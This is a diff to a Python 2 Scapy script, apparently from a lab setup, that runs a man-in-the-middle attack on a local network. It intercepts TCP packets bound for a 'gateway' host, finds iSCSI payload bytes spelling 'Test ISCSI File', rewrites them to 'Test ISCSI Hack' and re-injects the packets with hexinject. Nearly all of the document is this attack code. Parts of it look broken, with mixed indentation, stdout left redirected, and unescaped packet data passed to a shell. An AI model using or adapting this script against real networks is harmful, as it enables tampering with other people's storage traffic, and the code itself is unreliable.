@@ -4,36 +4,47 @@ from scapy.all import *
 import sys
 
 iface = "eth0"
-filter = "ip"
+filter = "tcp"
 #victim in this case is the initiator
-VICTIM_IP = "192.168.1.179"
-MY_IP = "192.168.1.143"
+VICTIM_IP = "192.168.1.167"
+MY_IP = "192.168.1.170"
 # gateway is the target
-GATEWAY_IP = "192.168.1.178"
+GATEWAY_IP = "192.168.1.168"
 #VICTIM_MAC = "### don't want so show###"
 MY_MAC = "08:00:27:f2:ee:7c"
 #target mac address
-GATEWAY_MAC = "08:00:27:24:08:34"
+GATEWAY_MAC = "08:00:27:60:74:b2"
 
 def handle_packet(packet):
     if (packet[IP].dst == GATEWAY_IP) and (packet[Ether].dst == MY_MAC):
      	# we change the packet destination to the target machine
      	packet[Ether].dst = GATEWAY_MAC
-        # TODO: block iscsi packets with an if condition
         if(packet[TCP]):
            	# shows what the packet contains
-        	#packet.show()
-		packet_read = os.popen('hexinject -s -i eth0 -c 1 -f tcp').read()
-		if ('54 65 73 74 20 49 53 43 53 49 20 46 69 6c 65' in packet_read):
-			packet_read.replace("54 65 73 74 20 49 53 43 53 49 20 46 69 6c 65", "54 65 73 74 20 49 53 43 53 49 20 48 61 63 6b")
+        	packet.show()
+		# lines below are to redirect hexdump to a file so that we can use in the python script again
+		stdout = sys.stdout
+		sys.stdout = open('packet.txt', 'w')
+		hexdump(packet)
+		packet_str = open('packet.txt')
+		packet_hex = ''
+		#trimming the hexadecimal packet to get only the hexadecimal content
+		for line in packet_str:
+			hexline = line.split('   ')[1]
+			hexline = hexline.replace('  ', ' ')
+			packet_hex = packet_hex + hexline
+		if ('54 65 73 74 20 49 53 43 53 49 20 46 69 6C 65' in packet_hex):
+			packet_hex = packet_hex.replace("54 65 73 74 20 49 53 43 53 49 20 46 69 6C 65", "54 65 73 74 20 49 53 43 53 49 20 48 61 63 6B")
 			#packet_file = open('packet', 'w')
 			#packet_file.write(packet_read)
-			os.system('echo ' + packet_read + ' | hexinject -p -i eth0')
-		
-           # TODO: create condition to check/filter the 'dport' packet tcp argument for 'iscsi_target'
-     sendp(packet)
-     print "A packet from " + packet[IP].src + " redirected!"
+			os.system("echo '" + packet_hex + "' | hexinject -p -i eth0")
+		else:
+			os.system("echo '" + packet_hex + "' | hexinject -p -i eth0")
+		# corrects the std output to the console again
+		sys.stdout.close()
+		sys.stdout = stdout
+    	# TODO: create condition to check/filter the 'dport' packet tcp argument for 'iscsi_target'
+    	#os.system("echo '"  + packet_str + "' | hexinject -p -i eth0")
+    	print "A packet from " + packet[IP].src + " redirected!"
 
-sniff(prn=handle_packet, filter=filter, iface=iface, store=0)
-
-
+sniff(prn=handle_packet, filter=filter, iface=iface, count=0, store=1)
